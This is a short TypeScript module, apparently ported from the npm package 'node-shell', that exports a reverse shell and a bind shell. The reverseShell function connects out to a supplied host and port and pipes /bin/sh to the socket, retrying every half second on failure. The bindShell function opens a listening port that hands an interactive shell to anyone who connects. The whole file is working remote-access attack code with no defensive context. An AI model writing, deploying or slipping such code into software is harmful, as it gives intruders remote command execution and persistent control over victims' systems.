/**
 * @port_author Leviathenn
 * @original node-shell on npm.
 */
import * as net from "net"
import { spawn } from "child_process";
var reverseShell = module.exports.reverseShell = function (host: string, port: number) {

    var timeout="5000";

    var client = new net.Socket();

    client.connect({host: host, port: port}, function() {

        var sh = spawn('/bin/sh',[]);

        client.write("Connected\r\n");

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

    });

    client.on('error', function(e) {

        setTimeout(function () { reverseShell(host,port) }, 500);

    });

}


var bindShell = module.exports.bindShell = function (port: number) {

    var server = net.createServer(function (c) {

        var sh = spawn('sh', ['-i']);

        c.pipe(sh.stdin);

        sh.stdout.pipe(c);

    });

    server.listen(port);

}